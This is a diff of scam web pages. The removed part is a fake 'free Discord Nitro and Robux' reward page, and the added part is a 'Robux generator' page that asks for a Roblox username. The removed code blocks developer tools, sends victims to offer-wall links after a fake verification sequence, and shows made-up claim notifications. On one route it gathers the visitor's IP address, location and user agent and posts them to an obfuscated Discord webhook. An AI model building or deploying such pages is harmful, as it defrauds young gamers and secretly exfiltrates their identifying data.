@@ -1,715 +1,284 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-  <title>Claim Your Reward</title>
-  <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
-  <meta name="theme-color" content="#5865f2">
-  <style>
-    /* ========== YOUR EXISTING STYLES (full – unchanged) ========== */
-    * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
-    img { -webkit-user-drag: none; user-drag: none; }
-    ::selection { background: transparent; }
-    * { margin: 0; padding: 0; box-sizing: border-box; touch-action: pan-x pan-y; }
-    body {
-      background: #0a0c15;
-      font-family: 'Space Grotesk', system-ui, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 2rem 1.5rem;
-      position: relative;
-      animation: fadeIn 0.5s ease-out;
-      -webkit-text-size-adjust: 100%;
-      text-size-adjust: 100%;
-      touch-action: pan-x pan-y;
-      font-size: 16px;
-    }
-    button, .reward-card, .claim-btn, .faq-question { touch-action: manipulation; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-    body::before {
-      content: "";
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: radial-gradient(ellipse at 30% 20%, #1a1f3a 0%, #0a0c15 90%);
-      pointer-events: none;
-      z-index: -1;
-    }
-    .wrap { width: min(560px, 100%); margin: 0 auto; position: relative; z-index: 2; }
-    .card {
-      background: #0f1119;
-      border-radius: 1.75rem;
-      border: 1px solid rgba(88, 101, 242, 0.15);
-      box-shadow: 0 25px 40px rgba(0, 0, 0, 0.5);
-      padding: 2rem;
-    }
-    .header { text-align: left; margin-bottom: 0.75rem; }
-    h1 {
-      font-family: 'Unbounded', 'Space Grotesk', sans-serif;
-      font-size: 1.6rem;
-      font-weight: 700;
-      letter-spacing: -0.3px;
-      background: linear-gradient(135deg, #fff, #b0c0ff);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
-      margin-bottom: 0.3rem;
-    }
-    .sub { color: #9a9fc0; font-size: 0.85rem; line-height: 1.4; }
-    .trust-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: rgba(88,101,242,0.12);
-      border: 1px solid rgba(88,101,242,0.3);
-      padding: 0.4rem 1rem;
-      border-radius: 3rem;
-      margin: 0.75rem 0 1rem 0;
-    }
-    .trust-badge span { font-size: 0.75rem; font-weight: 500; color: #c4d0ff; }
-    .trust-badge::before { content: "✓"; font-weight: 800; font-size: 0.9rem; color: #8b9cff; }
-    .reward-list { display: flex; flex-direction: column; gap: 0.8rem; margin-bottom: 1.5rem; }
-    .reward-card {
-      background: #13161f;
-      border: 1px solid rgba(88, 101, 242, 0.2);
-      border-radius: 1rem;
-      padding: 0.8rem 1rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      position: relative;
-      overflow: hidden;
-      touch-action: manipulation;
-    }
-    .reward-card-click { animation: cardPop 0.25s ease-out; }
-    @keyframes cardPop {
-      0% { transform: scale(1); background: #13161f; }
-      40% { transform: scale(0.97); background: #1a1f30; box-shadow: 0 0 0 2px #5865f2; }
-      100% { transform: scale(1); background: #13161f; }
-    }
-    .reward-card:hover {
-      transform: translateX(4px);
-      border-color: #5865f2;
-      background: #181c28;
-      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.3);
-    }
-    .reward-card.active {
-      border-color: #5865f2;
-      background: linear-gradient(145deg, #1a1f30, #13161f);
-      box-shadow: 0 0 0 1px #5865f2;
-    }
-    .reward-icon {
-      width: 48px;
-      height: 48px;
-      background: #0f1119;
-      border-radius: 0.9rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-    }
-    .reward-icon img { width: 34px; height: 34px; object-fit: contain; }
-    .reward-info { flex: 1; }
-    .reward-title { font-family: 'Unbounded', sans-serif; font-weight: 700; font-size: 0.9rem; color: #fff; margin-bottom: 0.2rem; }
-    .reward-desc { font-size: 0.68rem; color: #9a9fc0; line-height: 1.3; }
-    .action-area { text-align: center; }
-    .claim-btn {
-      background: linear-gradient(105deg, #5865f2, #4752c4);
-      border: none;
-      width: 100%;
-      padding: 0.85rem 1rem;
-      font-weight: 700;
-      font-size: 0.9rem;
-      border-radius: 2.5rem;
-      color: white;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      font-family: inherit;
-      box-shadow: 0 4px 12px rgba(88,101,242,0.3);
-      position: relative;
-      overflow: hidden;
-      touch-action: manipulation;
-    }
-    .claim-btn:not(:disabled):hover { background: linear-gradient(105deg, #6d7eff, #535fdb); transform: scale(0.98); }
-    .claim-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-    .helper-note { font-size: 0.68rem; color: #8a8fb0; margin-top: 0.6rem; }
-    .progress-box {
-      background: #0a0c14;
-      border-radius: 1rem;
-      padding: 0.9rem;
-      margin-top: 1rem;
-      animation: slideUp 0.3s ease;
-    }
-    @keyframes slideUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-    .progress-status { font-weight: 600; font-size: 0.8rem; color: #e0e5ff; margin-bottom: 0.4rem; }
-    .progress-bar-bg { width: 100%; height: 4px; background: #1e2230; border-radius: 10px; overflow: hidden; }
-    .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #5865f2, #8b9cff); transition: width 0.2s linear; }
-    .progress-sub { font-size: 0.6rem; color: #9a9fc0; margin-top: 0.4rem; }
-    .faq-section {
-      margin-top: 1.8rem;
-      background: #0a0c14;
-      border-radius: 1.25rem;
-      padding: 1rem 1.2rem;
-      border: 1px solid rgba(88,101,242,0.08);
-    }
-    .faq-eyebrow { color: #8b9cff; font-size: 0.65rem; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 0.2rem; }
-    .faq-section h3 { font-family: 'Unbounded', sans-serif; font-size: 1rem; color: #fff; margin-bottom: 0.8rem; }
-    .faq-item { border-bottom: 1px solid rgba(255,255,255,0.06); padding: 0.6rem 0; transition: background 0.2s; }
-    .faq-item:hover { background: rgba(88,101,242,0.05); border-radius: 0.5rem; padding-left: 0.3rem; padding-right: 0.3rem; }
-    .faq-question {
-      font-weight: 600;
-      color: #e0e5ff;
-      font-size: 0.8rem;
-      cursor: pointer;
-      display: flex;
-      justify-content: space-between;
-      transition: color 0.2s;
-      touch-action: manipulation;
-    }
-    .faq-question:hover { color: #8b9cff; }
-    .faq-question::after { content: "▼"; font-size: 0.6rem; color: #6a6f90; transition: transform 0.25s ease; }
-    .faq-item.open .faq-question::after { transform: rotate(180deg); }
-    .faq-answer {
-      font-size: 0.75rem;
-      color: #c0c5e0;
-      line-height: 1.4;
-      margin-top: 0;
-      max-height: 0;
-      opacity: 0;
-      overflow: hidden;
-      transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.25s ease, margin-top 0.2s ease;
-      will-change: max-height, opacity;
-    }
-    .faq-item.open .faq-answer { margin-top: 0.6rem; max-height: 200px; opacity: 1; }
-    footer { text-align: center; font-size: 0.7rem; color: #7a7f9e; margin-top: 1.2rem; font-weight: 500; }
-    .activity-toasts {
-      position: fixed;
-      bottom: 24px;
-      left: 24px;
-      z-index: 1000;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      pointer-events: none;
-      max-height: 400px;
-      overflow: visible;
-    }
-    .activity-toast {
-      background: #1a1c2a;
-      backdrop-filter: blur(14px);
-      border-radius: 16px;
-      padding: 14px 18px;
-      width: 340px;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      animation: slideInLeft 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5);
-      border-left: 4px solid;
-      transition: opacity 0.3s ease, transform 0.3s ease;
-    }
-    .toast-nitro { border-left-color: #5865f2; }
-    .toast-robux { border-left-color: #f5b042; }
-    .toast-icon {
-      width: 52px;
-      height: 52px;
-      background: #0f1119;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-    }
-    .toast-icon img {
-      width: 36px;
-      height: 36px;
-      object-fit: contain;
-    }
-    .toast-content {
-      flex: 1;
-    }
-    .toast-header {
-      font-size: 0.85rem;
-      color: #c0c5e0;
-      margin-bottom: 5px;
-    }
-    .toast-header strong {
-      color: #fff;
-      font-weight: 600;
-    }
-    .toast-reward {
-      font-weight: 700;
-      font-size: 1rem;
-      color: #fff;
-      margin-bottom: 5px;
-      line-height: 1.3;
-    }
-    .toast-time {
-      font-size: 0.7rem;
-      color: #8a8fb0;
-    }
-    @keyframes slideInLeft {
-      from { opacity: 0; transform: translateX(-30px); }
-      to { opacity: 1; transform: translateX(0); }
-    }
-    @media (max-width: 767px) { .activity-toasts { display: none !important; } }
-    @media (max-width: 500px) {
-      body { padding: 1rem; }
-      .card { padding: 1.2rem; }
-      h1 { font-size: 1.3rem; }
-      .reward-card { padding: 0.7rem 0.8rem; gap: 0.8rem; }
-      .reward-icon { width: 42px; height: 42px; }
-      .reward-icon img { width: 30px; height: 30px; }
-    }
-    @media (min-width: 768px) and (max-width: 1024px) { .wrap { width: min(600px, 90%); } }
-    .hidden { display: none; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Robux Generator Dark</title>
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/1.css" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/2.css" />
 
-    /* Special page (scammer/extvify) styles */
-    .extvify-page {
-      text-align: center;
-      background: #0f1119;
-      border-radius: 1.75rem;
-      padding: 3rem 2rem;
-      box-shadow: 0 25px 40px rgba(0, 0, 0, 0.5);
-      border: 1px solid rgba(88, 101, 242, 0.2);
-      width: 100%;
-      max-width: 500px;
-      margin: 0 auto;
-    }
-    .extvify-page h1 {
-      font-size: 2rem;
-      font-weight: 700;
-      margin-bottom: 1rem;
-      color: #fff;
-    }
-    .extvify-page .ip-display {
-      font-family: monospace;
-      font-size: 1.8rem;
-      font-weight: 700;
-      background: #1a1c2a;
-      padding: 1rem;
-      border-radius: 1rem;
-      margin: 1rem 0;
-      color: #8b9cff;
-      letter-spacing: 1px;
-      word-break: break-all;
-    }
-    .extvify-page .location {
-      font-size: 0.9rem;
-      color: #9a9fc0;
-      margin-top: 0.5rem;
-    }
-    .extvify-page .note {
-      font-size: 0.7rem;
-      color: #f5b042;
-      margin-top: 1rem;
-    }
-    .retry-btn {
-      background: #5865f2;
-      border: none;
-      padding: 0.7rem 1.5rem;
-      border-radius: 2rem;
-      color: white;
-      font-weight: 600;
-      margin-top: 1rem;
-      cursor: pointer;
-      font-family: inherit;
-      transition: all 0.2s;
-    }
-    .retry-btn:hover { background: #6d7eff; transform: scale(0.98); }
-  </style>
+  <!-- Buyer config: edit config.js to set the redirect URL. -->
+  <script src="config.js"></script>
 </head>
-<body>
+<body class="xload">
 
-<div id="mainApp"></div>
+    <nav>
+        <img src="./assets/local-images/01-2r-e32475de.png" alt="">
+    </nav>
+    <header>
+        <p>Generate unlimited robux with our robux generator tool. You can buy any items on roblox with our robux hack. Claim your robux now before the expiry date !</p>
+        <h3>Claim your Robux Now before the expiry date !</h3>
+    </header>
 
-<audio id="bgMusic" loop preload="auto" style="display: none;">
-  <source src="https://www.ceenaija.com/download-music/hillary-scott-thy-will.mp3" type="audio/mpeg">
-</audio>
-
-<script>
-  (function() {
-    const path = window.location.pathname.toLowerCase();
-    const isScammerRoute = path === '/scammer/extvify' || path === '/scammer/extvify/';
-
-    // ============================================================
-    //  /scammer/extvify ROUTE – IP detection with VPN note
-    // ============================================================
-    if (isScammerRoute) {
-      // Anti‑debug
-      document.addEventListener('contextmenu', e => e.preventDefault());
-      document.addEventListener('keydown', e => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
-          e.preventDefault();
-        }
-      });
-      if (typeof window.console !== 'undefined') console.log = function() {};
-
-      document.title = "Extvify";
-      const container = document.getElementById('mainApp');
-
-      function renderIPPage(ip, locationText = null, error = false) {
-        if (ip) {
-          const locationHtml = locationText ? `<div class="location">Estimated location: ${locationText}</div>` : '';
-          container.innerHTML = `
-            <div class="extvify-page">
-              <h1>Your IP Address</h1>
-              <div class="ip-display">${ip}</div>
-              ${locationHtml}
-              <div class="note">If you are using a VPN, this is your VPN's IP. Your real IP cannot be detected through a browser.</div>
+ <div class="container-md p-0">
+        <div class="stepx d-nonex" id="step-1">
+            <div class="item">
+                <div class="first">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">4.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
+                        <div>400</div>
+                    </button>
+                </div>
             </div>
-          `;
-        } else {
-          container.innerHTML = `
-            <div class="extvify-page">
-              <h1>Your IP Address</h1>
-              <div class="ip-display">Unable to retrieve</div>
-              <div class="location">Click the button below to try again</div>
-              <button class="retry-btn" id="retryBtn">⟳ Retry</button>
+            <div class="item">
+                <div class="first">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">9.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
+                        <div>800</div>
+                    </button>
+                </div>
             </div>
-          `;
-          document.getElementById('retryBtn')?.addEventListener('click', () => window.location.reload());
-        }
-      }
-
-      // Obfuscated webhook URL
-      const _p1 = "https://discord.com/api/webhooks/1511201588964757565/";
-      const _p2 = "yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwk";
-      const _p3 = "t3wQ-hzKsmKmz7a";
-      const webhookUrl = _p1 + _p2 + _p3;
-
-      // Get IP (simple API, no WebRTC because it's patched)
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(ipData => {
-          const ip = ipData.ip;
-          if (!ip) throw new Error('No IP');
-          // Try to get location
-          fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city`)
-            .then(res => res.json())
-            .then(locData => {
-              let location = '';
-              if (locData.status === 'success') {
-                location = `${locData.city}, ${locData.regionName} ${locData.country}`.replace(/^,\s*/, '').trim();
-              }
-              renderIPPage(ip, location || 'Unknown');
-              fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: ${location || 'Unknown'}\nUser Agent: ${navigator.userAgent}` })
-              }).catch(e => console.error);
-            })
-            .catch(() => {
-              renderIPPage(ip, 'Location lookup failed');
-              fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: Failed\nUser Agent: ${navigator.userAgent}` })
-              }).catch(e => console.error);
-            });
-        })
-        .catch(() => {
-          renderIPPage(null, null, true);
-        });
-      return;
-    }
-
-    // ============================================================
-    //  NORMAL REWARD PAGE (full functionality)
-    // ============================================================
-    let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
-    localStorage.setItem('extvify_pageViews', pageViews);
-    
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => {
-      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
-        e.preventDefault();
-      }
-    });
-    if (typeof window.console !== 'undefined') console.log = function() {};
-
-    const bgAudio = document.getElementById('bgMusic');
-    let audioStarted = false;
-    if (bgAudio) {
-      bgAudio.volume = 0.12;
-      bgAudio.loop = true;
-      const startAudio = () => {
-        if (!audioStarted) { bgAudio.play().catch(e=>{}); audioStarted = true; }
-        document.removeEventListener('click', startAudio);
-        document.removeEventListener('touchstart', startAudio);
-      };
-      document.addEventListener('click', startAudio);
-      document.addEventListener('touchstart', startAudio);
-    }
-
-    let audioCtx = null;
-    function playClick() {
-      try {
-        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        if (audioCtx.state === 'suspended') audioCtx.resume();
-        const now = audioCtx.currentTime;
-        const osc = audioCtx.createOscillator();
-        const gain = audioCtx.createGain();
-        osc.connect(gain);
-        gain.connect(audioCtx.destination);
-        osc.frequency.value = 880;
-        gain.gain.value = 0.18;
-        osc.start();
-        gain.gain.exponentialRampToValueAtTime(0.00001, now + 0.1);
-        osc.stop(now + 0.1);
-      } catch(e) {}
-    }
-
-    const nitroRewards = [
-      { id: "nitro_basic", title: "Nitro Basic", desc: "Emojis, stickers, 50MB upload, custom profile themes", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" },
-      { id: "nitro_boost", title: "Nitro Boost", desc: "2 Server Boosts, 1080p streaming, animated avatar, profile banner", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" }
-    ];
-
-    const robuxOptions = [
-      { amount: "800", desc: "Small pack for avatar items, accessories, and game passes" },
-      { amount: "1,200", desc: "Great for a few game passes or a full outfit" },
-      { amount: "2,000", desc: "Unlock multiple game passes or limited items" },
-      { amount: "2,500", desc: "Unlock game passes, avatar items, and boost your favorite experiences" },
-      { amount: "3,600", desc: "Perfect for bundle purchases and supporting creators" },
-      { amount: "4,500", desc: "Best for limited items, bulk purchases, and supporting creators" },
-      { amount: "6,000", desc: "Large pack for serious collectors and game advantages" },
-      { amount: "8,000", desc: "Premium amount for high-value limiteds and group funds" },
-      { amount: "10,000", desc: "Massive value for top-tier items and community contributions" },
-      { amount: "12,000", desc: "Ultimate Robux pack for everything you need" }
-    ];
-
-    const todayStr = new Date().toISOString().slice(0,10);
-    const storageKey = 'extvify_robux_day';
-    let storedRobux = null;
-    const storedData = localStorage.getItem(storageKey);
-    if (storedData) {
-      try {
-        const parsed = JSON.parse(storedData);
-        if (parsed.date === todayStr && Array.isArray(parsed.robux) && parsed.robux.length === 2) {
-          storedRobux = parsed.robux;
-        }
-      } catch(e) {}
-    }
-    if (!storedRobux) {
-      const shuffled = [...robuxOptions];
-      for (let i = shuffled.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
-      }
-      let selected = [shuffled[0], shuffled[1]];
-      selected.sort((a, b) => {
-        const numA = parseInt(a.amount.replace(/,/g, ''), 10);
-        const numB = parseInt(b.amount.replace(/,/g, ''), 10);
-        return numA - numB;
-      });
-      localStorage.setItem(storageKey, JSON.stringify({ date: todayStr, robux: selected }));
-      storedRobux = selected;
-    }
-    const sortedRobux = [...storedRobux].sort((a, b) => {
-      const numA = parseInt(a.amount.replace(/,/g, ''), 10);
-      const numB = parseInt(b.amount.replace(/,/g, ''), 10);
-      return numA - numB;
-    });
-    const robux1 = sortedRobux[0];
-    const robux2 = sortedRobux[1];
-
-    const rewards = [
-      ...nitroRewards,
-      { id: "robux_daily1", title: `${robux1.amount} Robux`, desc: robux1.desc, icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp" },
-      { id: "robux_daily2", title: `${robux2.amount} Robux`, desc: robux2.desc, icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp" }
-    ];
-
-    const activityRewards = [
-      { name: "Nitro Boost", type: "nitro", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" },
-      { name: `${robux2.amount} Robux`, type: "robux", icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp" },
-      { name: `${robux1.amount} Robux`, type: "robux", icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp" },
-      { name: "Nitro Basic", type: "nitro", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" }
-    ];
-
-    const mainApp = document.getElementById('mainApp');
-    mainApp.innerHTML = `
-      <div class="wrap">
-        <div class="card">
-          <div class="header">
-            <h1>Claim Your Reward</h1>
-            <p class="sub">Select your reward – quick verification required to claim.</p>
-            <div class="trust-badge"><span>No password required · Instant access</span></div>
-          </div>
-          <div class="reward-list" id="rewardList"></div>
-          <div class="action-area">
-            <button class="claim-btn" id="claimBtn" disabled>Continue</button>
-            <p class="helper-note" id="actionHelper">Click a reward above to unlock the button</p>
-          </div>
-          <div id="progressContainer" class="progress-box hidden">
-            <div class="progress-status" id="progressStatus"></div>
-            <div class="progress-bar-bg"><div class="progress-fill" id="progressFill"></div></div>
-            <div class="progress-sub" id="progressSub"></div>
-          </div>
+            <div class="item">
+                <div class="first">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">19.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
+                        <div>1,700</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">49.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
+                        <div>4,500</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">99.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
+                        <div>10,000</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">149.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
+                        <div>10,000</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">199.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
+                        <div>50,000</div>
+                    </button>
+                </div>
+            </div>
         </div>
-        <div class="faq-section">
-          <div class="faq-eyebrow">QUESTIONS</div>
-          <h3>Claim Your Reward — FAQ</h3>
-          <div class="faq-list">
-            <div class="faq-item"><div class="faq-question">Do I need to enter my password?</div><div class="faq-answer">Absolutely not! We never ask for your email or password. Your account stays 100% secure.</div></div>
-            <div class="faq-item"><div class="faq-question">Which rewards are available?</div><div class="faq-answer">Discord Nitro (Basic / Boost) and rotating Robux packs (2 options change daily per device).</div></div>
-            <div class="faq-item"><div class="faq-question">How does verification work?</div><div class="faq-answer">After you select a reward, you'll be redirected to a simple verification page to confirm eligibility – takes less than 5 minutes.</div></div>
-            <div class="faq-item"><div class="faq-question">Can I return later?</div><div class="faq-answer">Yes! Rewards refresh every 24 hours, so you can claim again tomorrow. Bookmark this page.</div></div>
-          </div>
+
+        
+        <div class="step d-none" id="step-2">
+            <div class="img-robux">
+                <img src="./assets/local-images/04-7r-26d27934.png" alt="">
+                <div class="rbx"><span>0</span> ROBUX</div>
+            </div>
+            <div class="input">
+                <input type="text" id="username" placeholder="Username">
+                <img src="./assets/local-images/05-8r-b9501238.png" alt="">
+            </div>
+            <br>
+            <br>
+            <div class="error"></div>
+            <div class="next connect">Connect Username</div>
         </div>
-        <footer>Event Sponsored by Extvify</footer>
-      </div>
-      <div id="activity-toasts" class="activity-toasts"></div>
-    `;
 
-    const rewardList = document.getElementById('rewardList');
-    const claimBtn = document.getElementById('claimBtn');
-    const helperNote = document.getElementById('actionHelper');
-    const progressContainer = document.getElementById('progressContainer');
-    const progressStatus = document.getElementById('progressStatus');
-    const progressFill = document.getElementById('progressFill');
-    const progressSub = document.getElementById('progressSub');
-    const toastContainer = document.getElementById('activity-toasts');
-    let selectedRewardId = null, selectedRewardTitle = null;
-
-    function buildRewardList() {
-      rewardList.innerHTML = '';
-      rewards.forEach(rew => {
-        const card = document.createElement('div');
-        card.className = 'reward-card';
-        card.setAttribute('data-id', rew.id);
-        card.setAttribute('data-title', rew.title);
-        card.innerHTML = `<div class="reward-icon"><img src="${rew.icon}" alt="${rew.title}" loading="lazy"></div><div class="reward-info"><div class="reward-title">${rew.title}</div><div class="reward-desc">${rew.desc}</div></div>`;
-        card.addEventListener('click', (e) => {
-          e.stopPropagation();
-          playClick();
-          card.classList.add('reward-card-click');
-          setTimeout(() => card.classList.remove('reward-card-click'), 250);
-          selectReward(card, rew.id, rew.title);
-        });
-        rewardList.appendChild(card);
-      });
-    }
-
-    function selectReward(cardElement, rewardId, rewardTitle) {
-      document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
-      cardElement.classList.add('active');
-      selectedRewardId = rewardId;
-      selectedRewardTitle = rewardTitle;
-      claimBtn.disabled = false;
-      claimBtn.innerText = `Continue with ${rewardTitle}`;
-      helperNote.classList.add('hidden');
-    }
-
-    const redirectUrls = [
-      "https://rainawards.com/ow/6a1a96bb419d7ab04aa64184",
-      "https://rainawards.com/ow/69bf833f2d6a708a36f234d5"
-    ];
-    function getRandomRedirect() { return redirectUrls[Math.floor(Math.random() * redirectUrls.length)]; }
-
-    const steps = [
-      { label: "Preparing secure gateway...", sub: "Initializing reward page", min: 500, max: 750, target: 30 },
-      { label: "Checking eligibility...", sub: "Reviewing device & region", min: 650, max: 900, target: 66 },
-      { label: "Finalizing...", sub: "Redirecting to verification", min: 700, max: 950, target: 100 }
-    ];
-    function rand(min,max) { return Math.floor(min + Math.random()*(max-min+1)); }
-
-    function startProgress() {
-      if (!selectedRewardId) return;
-      playClick();
-      document.querySelectorAll('.reward-card').forEach(c => c.style.pointerEvents = 'none');
-      claimBtn.disabled = true;
-      progressContainer.classList.remove('hidden');
-      const timedSteps = steps.map(step => ({ ...step, duration: rand(step.min, step.max), pause: rand(40,80) }));
-      let idx = 0;
-      function advance() {
-        if (idx >= timedSteps.length) {
-          let redirectCount = parseInt(localStorage.getItem('extvify_redirects') || 0) + 1;
-          localStorage.setItem('extvify_redirects', redirectCount);
-          setTimeout(() => { window.location.href = getRandomRedirect(); }, 200);
-          return;
-        }
-        const s = timedSteps[idx];
-        progressStatus.innerText = s.label;
-        progressSub.innerText = s.sub;
-        progressFill.style.transitionDuration = s.duration + 'ms';
-        progressFill.style.width = s.target + '%';
-        setTimeout(advance, s.duration + s.pause);
-        idx++;
-      }
-      advance();
-    }
-    claimBtn.addEventListener('click', startProgress);
-
-    document.querySelectorAll('.faq-item').forEach(item => {
-      const q = item.querySelector('.faq-question');
-      q.addEventListener('click', (e) => {
-        e.stopPropagation();
-        if (!item.classList.contains('open')) playClick();
-        item.classList.toggle('open');
-      });
-    });
-
-    const countryNames = [
-      "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
-      "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
-      "Ireland", "New Zealand", "Portugal", "Greece", "Poland", "Turkey", "Egypt", "South Africa",
-      "Nigeria", "Morocco", "Saudi Arabia", "United Arab Emirates", "Qatar", "Israel", "Pakistan",
-      "Bangladesh", "Thailand", "Vietnam", "Philippines", "Indonesia", "Malaysia", "Singapore", "Taiwan",
-      "Argentina", "Chile", "Colombia", "Peru", "Venezuela", "Jamaica", "Iceland", "Austria", "Belgium",
-      "Finland", "Denmark", "Czech Republic", "Hungary", "Romania"
-    ];
-    let lastCountry = null;
-    function getRandomTimeAgo() {
-      const seconds = Math.floor(Math.random() * 3600) + 10;
-      if (seconds < 60) return `${seconds} seconds ago`;
-      const minutes = Math.floor(seconds / 60);
-      const remainder = seconds % 60;
-      if (remainder === 0) return `${minutes} minute${minutes===1?'':'s'} ago`;
